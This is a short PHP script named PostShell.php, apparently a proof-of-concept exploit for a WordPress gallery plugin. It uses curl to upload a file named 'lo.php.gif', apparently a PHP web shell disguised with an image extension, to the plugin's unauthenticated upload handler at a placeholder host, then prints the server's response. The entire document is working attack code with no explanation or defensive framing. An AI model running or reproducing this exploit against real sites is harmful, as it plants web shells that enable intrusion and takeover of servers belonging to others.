PostShell.php
<?php

$uploadfile="lo.php.gif";
$ch = 
curl_init("http://www.exemple.com/wordpress/wp-content/plugins/gallery-plugin/upload/php.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
         array('qqfile'=>"@$uploadfile"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";

?>
